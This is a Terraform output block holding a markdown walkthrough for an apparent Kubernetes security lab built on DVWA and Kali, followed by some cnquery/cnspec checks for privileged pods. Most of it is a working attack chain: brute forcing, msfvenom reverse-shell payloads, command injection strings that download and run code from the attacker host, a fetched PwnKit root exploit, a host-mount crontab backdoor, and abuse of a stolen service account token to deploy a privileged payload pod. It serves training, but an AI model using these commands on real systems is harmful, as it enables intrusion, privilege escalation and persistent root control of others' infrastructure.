################################################################################
# Additional
################################################################################

output "hack_write_up" {
  value = <<EOT
# Minikube hack

- login to your Ubuntu machine

```bash
ssh -o StrictHostKeyChecking=no ubuntu@${module.ubuntu-k8s-instance.public_ip}

password: ${random_string.suffix.result}
```

- start the minikube kubernetes cluster

```bash
ubuntu@ip-10-0-4-175:~$ minikube start --driver=docker --force
😄  minikube v1.25.2 on Ubuntu 20.04 (xen/amd64)
✨  Using the docker driver based on user configuration
👍  Starting control plane node minikube in cluster minikube
🚜  Pulling base image ...
💾  Downloading Kubernetes v1.23.3 preload ...
    > preloaded-images-k8s-v17-v1...: 505.68 MiB / 505.68 MiB  100.00% 52.76 Mi
    > gcr.io/k8s-minikube/kicbase: 379.06 MiB / 379.06 MiB  100.00% 28.09 MiB p
🔥  Creating docker container (CPUs=2, Memory=2200MB) ...
🐳  Preparing Kubernetes v1.23.3 on Docker 20.10.12 ...
    ▪ kubelet.housekeeping-interval=5m
    ▪ Generating certificates and keys ...
    ▪ Booting up control plane ...
    ▪ Configuring RBAC rules ...
🔎  Verifying Kubernetes components...
    ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5
🌟  Enabled addons: storage-provisioner, default-storageclass
🏄  Done! kubectl is now configured to use "minikube" cluster and "default" namespace by default
```

- deploy the DVWA in the kubernetes cluster

```bash
ubuntu@ip-10-0-4-175:~$ kubectl apply -f dvwa-deployment.yaml
```

- check and configure the DVWA (login: admin/password)
- Open a browser and navigate to http://${module.ubuntu-k8s-instance.public_ip}:8080.
- Log in to DVWA using `admin` with the password `password`.
- Once logged in, click on "Create / Reset Database" after which, you will be logged out. Log back in to the web application and click on "Command Injection."
- Next, open three command line terminals and continue the setup process.

- get the POD name

```bash
ubuntu@ip-10-0-4-175:~$ kubectl get pods
NAME                                     READY   STATUS    RESTARTS   AGE
dvwa-container-escape-8654469d85-7kszd   1/1     Running   0          35s
```

- configure a port forwarding for the DVWA WebApp

```bash
ubuntu@ip-10-0-4-175:~$ kubectl port-forward --address 0.0.0.0 dvwa-container-escape-XXXXXX 8080:80
```

- login to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- install some additional packages

```bash
sudo apt update
sudo apt install -y wordlists gobuster dirsearch metasploit-framework golang patator
sudo gem install webrick
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

## Port scanning

- scan your linux target with nmap

```bash
sudo nmap -A ${module.ubuntu-k8s-instance.private_ip}
```

```
http://${module.ubuntu-k8s-instance.private_ip}:8080
http://${module.ubuntu-k8s-instance.public_ip}:8080
```

## dir buster

gobuster dir -u http://${module.ubuntu-k8s-instance.private_ip}:8080 -w /usr/lib/python3/dist-packages/dirsearch/db/dicc.txt -q

## brute force login

### fix patator

- if you get the following error `<class 'pycurl.error'> (49, "Couldn't parse CURLOPT_RESOLVE entry ''!")` then edit `/usr/bin/patator`

```bash
sudo vim /usr/bin/patator
```

- search for `pycurl.RESOLVE` and comment out the line

```
#fp.setopt(pycurl.RESOLVE, [resolve])
```

- get a valid `user_token` and save it in the CSRF variable

```bash
CSRF=$(curl -s -c dvwa.cookie "${module.ubuntu-k8s-instance.private_ip}:8080/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
```

- get a valid session id

```bash
SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)
```

- execute the patator brute force tool to get valid credentials

```bash
patator http_fuzz 1=/usr/share/wordlists/metasploit/http_default_users.txt 0=/usr/share/wordlists/metasploit/http_default_pass.txt --threads=8 timeout=1 --rate-limit=1 url="http://${module.ubuntu-k8s-instance.private_ip}:8080/login.php" method=POST body="username=FILE1&password=FILE0&user_token=$\{CSRF}&Login=Login" header="Cookie: PHPSESSID=$\{SESSIONID}" -x ignore:fgrep=login.php -x quit:fgrep=index.php follow=0 accept_cookie=0

09:01:15 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.10 at 2022-06-03 09:01 UTC
09:01:15 patator    INFO -                                                                              
09:01:15 patator    INFO - code size:clen       time | candidate                          |   num | mesg
09:01:15 patator    INFO - -----------------------------------------------------------------------------
09:01:17 patator    INFO - 302  424:0          0.012 | password:admin                     |    15 | HTTP/1.1 302 Found
09:01:18 patator    INFO - Hits/Done/Skip/Fail/Size: 1/22/0/0/234, Avg: 6 r/s, Time: 0h 0m 3s
09:01:18 patator    INFO - To resume execution, pass --resume 3,3,3,3,3,3,2,2
```

## WebApp scanner

- scan the DVWA WebApp

```bash
nuclei -u http://${module.ubuntu-k8s-instance.private_ip}:8080
```

## Exploit command injectionin WebApp

- create the meterpreter for the DVWA container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=${module.kali.private_ip} LPORT=4242 -f elf > met-container
```

- start the metasploit framework for the DVWA container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

- login via another console to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

- execute the DVWA command injection exploit. After re-login go to [http://${module.ubuntu-k8s-instance.public_ip}:8080/vulnerabilities/exec/](http://${module.ubuntu-k8s-instance.public_ip}:8080/vulnerabilities/exec/) and execute the following commands.

```
;curl -vk http://${module.kali.private_ip}:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

- now you have a reverse meterpreter connection from the container, type `shell` to get a bash.
- get root within the DVWA container

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

- next we compromise the the ubuntu vm
- login via another console to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=${module.kali.private_ip} LPORT=4243 -f elf > met-host
```

- start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

- Execute the following commands in your root shell from the DVWA Container to get a root shell of the ubuntu docker host

```bash
mount /dev/nvme0n1p1 /mnt/
echo "*/1 * * * * root curl -vk http://${module.kali.private_ip}:8001/met-host -o /root/met && chmod 777 /root/met && /root/met" >> /mnt/etc/crontab
```

Now you got a root shell from your container host.

## DevOps Tools

- login to your Ubuntu machine

```bash
ssh -o StrictHostKeyChecking=no ubuntu@${module.ubuntu-k8s-instance.public_ip}

password: ${random_string.suffix.result}
```

- install cnquery

```bash
bash -c "$(curl -sSL https://install.mondoo.com/sh/cnquery)"
```

### List all privileged Pods 

- kubectl cli

```bash
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext | select(.privileged==true)).metadata.name'
```

- cnquery shell k8s

```bash
cnquery shell k8s

k8s.deployments[0] { containers { securityContext['privileged'] } }

k8s.pods[0] { containers { securityContext['privileged'] } }

k8s.pods.where( containers { securityContext['privileged'] == true } )

k8s.pods.where( labels['app'] == /dvwa/ ) { name kind }
```

- cnquery shell k8s manifest

```bash
cnquery shell k8s --path dvwa-deployment.yaml

k8s.deployments[0] { containers { securityContext['privileged'] } }

k8s.deployments.where( containers { securityContext['privileged'] == true } )
```

- cnquery shell container image

```bash
cnquery shell container docker.io/pmuench/dvwa-container-escape

packages.list.where( name == /ssh/ ) { * }
packages.list.where( name == /ssh/ ) { name version }

packages.list.where( name == /apache/ )
```

- create a query pack `query-pack-k8s.yml`

```bash
vim query-pack-k8s.yml
```

```yaml
packs:
  - uid: kubernetes-pod-security-info
    filters:
      - asset.platform == "k8s-pod"
    queries:
      - title: Gather Pods Security Context
        uid: k8s-pods-security-context
        query: |
          k8s.pod {
            initContainers {
              securityContext
            }
            containers {
              securityContext
            }
          }
```

```bash
cnquery explore k8s -f ./query-pack-k8s.yml --discover pods
```

- install cnspec

```bash
bash -c "$(curl -sSL https://install.mondoo.com/sh/cnspec)"
```

- cnspec shell k8s

```bash
k8s.deployments[0] { containers { securityContext['privileged'] != true } }

k8s.pods[0] { containers { securityContext['privileged'] != true } }

k8s.pods.where( containers { securityContext['privileged'] == true } ).length == 0
```

- cnspec shell k8s manifest

```bash
cnspec shell k8s --path dvwa-deployment.yaml

k8s.deployments[0] { containers { securityContext['privileged'] != true } }

k8s.deployments.where( containers { securityContext['privileged'] == true } ).length == 0
```

- cnspec shell container image

```bash
cnspec shell container docker.io/pmuench/dvwa-container-escape

packages.list.where( name == /ssh/ ) { * }
packages.list.where( name == /ssh/ ) { name version == '1:8.2p1-4ubuntu0.5' }

file('/etc/os-release').exists
file('/etc/os-release').permissions { group_readable }
file('/etc/os-release').content.contains('Ubuntu')
```

- create a cnspec policy

```bash
vim policy.yaml
```

```bash
policies:
  - uid: example1
    name: Example policy 1
    version: "1.0.0"
    scoring_system: 2
    authors:
      - name: Mondoo
        email: hello@mondoo.com
    specs:
      - asset_filter:
          query: platform.name == 'kubernetes'
        scoring_queries:
          example-01:
        data_queries:
          example-d-1:
queries:
  - uid: example-01
    title: Do not allow privileged containers
    query: |
      k8s.deployments { containers { securityContext['privileged'] != true name } }
      k8s.pods { containers { securityContext['privileged'] != true name } }
    severity: 90
  - uid: example-d-1
    title: Get some pod information
    query: k8s.pods { podSpec }
```

- execute the policy with cnspec

```bash
cnspec scan k8s --policy-bundle ./policy.yaml
```

## Service Account Hack

- login to your Ubuntu machine

```bash
ssh -o StrictHostKeyChecking=no ubuntu@${module.ubuntu-k8s-instance.public_ip}

password: ${random_string.suffix.result}
```

- deploy the DVWA in the kubernetes cluster

```bash
ubuntu@ip-10-0-4-175:~$ kubectl apply -f dvwa-deployment-no-privileged.yaml
```

- get the POD name

```bash
ubuntu@ip-10-0-4-175:~$ kubectl get pods
NAME                                                         READY   STATUS    RESTARTS   AGE
dvwa-container-escape-via-service-account-8654469d85-7kszd   1/1     Running   0          35s
```

- configure a port forwarding for the DVWA WebApp

```bash
ubuntu@ip-10-0-4-175:~$ kubectl port-forward --address 0.0.0.0 dvwa-container-escape-via-service-account-XXXXXX 8080:80
```

- login to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

## Exploit command injectionin WebApp

- create the meterpreter for the DVWA container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=${module.kali.private_ip} LPORT=4242 -f elf > met-container
```

- start the metasploit framework for the DVWA container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

- login via another console to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

- execute the DVWA command injection exploit. After re-login go to [http://${module.ubuntu-k8s-instance.public_ip}:8080/vulnerabilities/exec/](http://${module.ubuntu-k8s-instance.public_ip}:8080/vulnerabilities/exec/) and execute the following commands.

```
;curl -vk http://${module.kali.private_ip}:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

- now you have a reverse meterpreter connection from the container, type `shell` to get a bash.

- login via another console to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- create the meterpreter for the Kali container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=${module.kali.private_ip} LPORT=4244 -f elf > met-kali
```

- start the metasploit framework for the DVWA container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4244;run'
```

- deploy a Kali container via Service Account token

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token

APISERVER=https://kubernetes.default.svc
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
NAMESPACE=$(cat $\{SERVICEACCOUNT}/namespace)
TOKEN=$(cat $\{SERVICEACCOUNT}/token)
CACERT=$\{SERVICEACCOUNT}/ca.crt

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/version

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/api

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/apis/apps/v1

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/apis/apps/v1/namespaces/default/deployments

curl --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X POST $\{APISERVER}/apis/apps/v1/namespaces/default/deployments -H 'Content-Type: application/yaml' -d '---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-hacker
  namespace: default
spec:
  selector:
    matchLabels:
      app: kali-hacker
  template:
    metadata:
      labels:
        app: kali-hacker
    spec:
      containers:
        - name: dvwa
          image: docker.io/kalilinux/kali-rolling
          command: ["/bin/bash","-c","/usr/bin/apt update -y && /usr/bin/apt install -y curl && /usr/bin/curl -vk http://${module.kali.private_ip}:8001/met-kali -o /tmp/met && /usr/bin/chmod 777 /tmp/met && /tmp/met"]
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 80
          securityContext:
            privileged: true
      terminationGracePeriodSeconds: 30
'
```

- next we compromise the the ubuntu vm
- login via another console to your Kali machine

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=${module.kali.private_ip} LPORT=4243 -f elf > met-host
```

- start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

- execute the following command on the kali container

```bash
id
mount /dev/nvme0n1p1 /mnt/
echo "*/1 * * * * root curl -vk http://${module.kali.private_ip}:8001/met-host -o /root/met && chmod 777 /root/met && /root/met" >> /mnt/etc/crontab
```

# Logins

## Kali

Username and password:

```
kali: ${random_string.suffix.result}
```

ssh command:

```bash
ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
```

privat ip:

```
${module.kali.private_ip}
```

## Ubuntu K8s LINUX SSH:

Username and password:

```
ubuntu: ${random_string.suffix.result}
```

ssh command:

```bash
ssh -o StrictHostKeyChecking=no ubuntu@${module.ubuntu-k8s-instance.public_ip}
```

privat ip:

```
${module.ubuntu-k8s-instance.private_ip}
```

  EOT
}
